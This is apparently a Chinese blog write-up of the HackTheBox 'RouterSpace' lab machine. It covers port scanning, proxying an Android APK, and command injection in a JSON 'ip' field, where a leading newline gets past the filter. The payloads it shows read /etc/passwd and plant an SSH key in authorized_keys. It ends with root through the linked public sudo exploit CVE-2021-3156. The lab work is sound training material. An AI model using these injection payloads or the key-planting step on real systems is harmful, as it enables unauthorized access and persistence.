> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1TijQlfXQpkOJPKMvTYWpw)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 105篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvaZttiaAibHk9OOv3gnLKudibicBibKiaJiaM0wthNibYQ5IaXB8vRMFehqHJS4nkN09I4KyV1QMcCEBmeXw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
`靶机信息``靶机地址:``https://app.hackthebox.com/machines/RouterSpace``靶场: HackTheBox.com``靶机名称: RouterSpace``难度: 简单``提示信息:``无``目标:  user.txt和root.txt`
```

  

  

```
`实验环境``攻击机:Vbox Manjaro 10.10.16.43``靶机:10.10.11.148`
```

  

  

**信息收集**
--------

  

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- 10.10.11.148
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
sudo nmap -sC -sV -p22,80 10.10.11.148 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫描到22和80端口开放，先来看看80端口

  

**Web渗透**
---------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后发现只有一个APK下载链接可用，做个目录扫描检查是否有敏感目录

```
gobuster dir -u http://10.10.11.148 -w ../../Dict/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --wildcard
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫出来一堆，感觉任何目录都可以返回200，随便访问一个看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

原来是禁止暴破目录，看来要从apk下手了，先下载安装看看是个什么程序

```
wget http://10.10.11.148/RouterSpace.apk
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

安装APK到模拟器，并设置代理到burpsuite

安装APK

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

设置代理，按按连接名称弹出菜单中选择修改网络

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

代理选项中选择手动，填入burpsuite代理IP端口

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

运行APP

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

运行后进入主界面只有一个按钮，点击看看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

点击Check Status后提示路由器工作正常，来看看Burp抓到的包

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

APP访问了routerspace.htb域名，来绑定下域名

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

绑定后在Burp中将抓到的包发送到重放器(Repeater)，并点击发送，检查是否返回正常

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

返回200，从包中可以看到发送了IP为0.0.0.0的内容，将0.0.0.0替换掉看看能不能执行命令

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

替换为id后返回的数据同样出现了id，但是他在后面加了\n，又试了几个命令都会返回发出去的命令并且跟着\n，这应该是后台的过滤手段，想办法绕过他

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

经过测试，只需要在命令前面加了\n即可绕过，来找找敏感信息

```
"ip":"\ncat /etc/passwd"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

只有一个普通用户paul，继续找

```
"ip":"\ncat /home/paul/user.txt"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到user.txt，继续

```
"ip":"\ncat /home/paul/.ssh/id_rsa"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

当我想查看.ssh目录下的id_rsa文件时发送请求卡住不会返回信息，原因是没有这个文件（当输入不存在的命令时也是同样的效果）。既然没有那就创建一个authorized_keys文件来实现证书登录SSH

1。攻击机上生成SSH的公私密钥

```
`ssh-keygen``mv id_rsa.pub authorized_keys``chmod 600 id_rsa`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2。将authorized_keys写入到靶机上的.ssh目录

```
"ip":"\necho 'your public id_rsa key' >> /home/paul/.ssh/authorized_keys"
```

```
"ip":"\necho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMwlJEdRHix+11JdaMvwRhS5I9sAWdoTCma8KZ0yFV4UGhx+KcI+qDRVi0HNcsmw2MUxL6RjMfvMPPFv+HaQISnEerCzm3dAl7fhKaBJYaE0buh1jkZE6V8q1aEGPmXaBcRS/GIFtvXa4VQdmuNs5HTJDYXvH0MHAYSh3q4UIOKts1GpcPIduhkpKzIc2E6lpDA0KPmD1UZfYvQKld4wDrVz0UvhwHB8DldY3bHmr6QjeQ9FZh/X23vlTRxQ85DV4BXWdex0F6NpGbzFHfTUQ1fDLThCbpSvqijkiTNnFK12xi/oLPPGIYqIcZ/wQZfbrPf1uHqgH1c+72KjO6CKqN2sV0EP98AFl1pXecB1SbFNP7Rsquk/b3IvdcT0tK5F48iMxxva5a9+S6IdZvg1Ty6iZPLYMb87IfjvnaOFbwY3nJT/A4pTUVBoGNEbZjT28pyU1rn+qaTaC0yXZ2E668qCnsmZYZN8igkgddM5F778iS5IDxhry5pavQizlhcy8= m@Manjaro' >> /home/paul/.ssh/authorized_keys"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

检查下文件是否写入

```
"ip":"\ncat /home/paul/.ssh/authorized_keys"
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

写入成功，登录SSH

```
ssh paul@10.10.11.148 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，上传辅助脚本linpeas.sh检查敏感信息

```
sudo scp -i id_rsa -O linpeas.sh paul@10.10.11.148:/tmp/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

上传成功，执行脚本检查可利用的信息

```
`cd /tmp``./linpeas.sh`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现sudo版本为1.8.31，这个版本存在CVE-2021-3156漏洞

**CVE-2021-3156**

```
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
```

同样使用scp将exp.py上传上靶机

```
sudo scp -i id_rsa -O exp.py paul@10.10.11.148:/tmp
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

执行exp

```
python3 exp.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

提权成功，找找flag

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)